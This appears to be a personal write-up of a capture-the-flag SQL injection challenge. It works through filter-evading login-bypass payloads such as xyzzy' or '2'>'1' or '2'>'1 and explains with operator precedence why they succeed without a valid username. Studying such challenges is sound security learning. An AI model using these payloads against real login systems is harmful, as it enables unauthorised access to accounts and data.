
Trial and error <cough> methodical testing reveals I can't use = or # or --

So I tried to encode the equals

%3D, 0x3D, x'3D' but no sucess

So I fell back to just not using equals

' or '2'>'1

Doesn't work

xyzzy' or '2'>'1

Doesn't work

admin' or '2'>'1 

Worked - I like the SQL Injection challenges less because I tend to feel like
I'm just trying stuff until something works (especially when, like this one,
it doesn't give a mysql error message)

So it's going to be something like

select top 1 where username='..' and password='..'

Looking at operator precedence 

http://dev.mysql.com/doc/refman/5.0/en/operator-precedence.html

And has higher precedence so for 

xyzzy' or '2'>'1

select top 1 where username='xyzzy' or '2'>'1' and password='bleh'

'2'>'1' and password='bleh' - is evaluated first giving T && F = F

xyzzy is clearly not an existing username so it's F || F = F

So admin' or '2'>'1 

select top 1 where username='admin' or '2'>'1' and password='bleh'

Only works because there must be a username of admin, if there wasn't I
would still be bumbling <cough> methodically trying out stuff.

I don't like having to rely on having a valid username so to negate the and:

Use more or

xyzzy' or '2'>'1' or '2'>'1

This evaluates to 

select top 1 where username='xyzzy' or '2'>'1' or '2'>'1' and password='..'

F || T || T && F -> F || T || F -> T

Yay \o/

Given we don't need the or that nops the and out of the equation to be true
it could be anything, as long as it ends in an open string (to make it 
syntactially correct with the original closing ' : username='.....(') <- this

Xyzzy

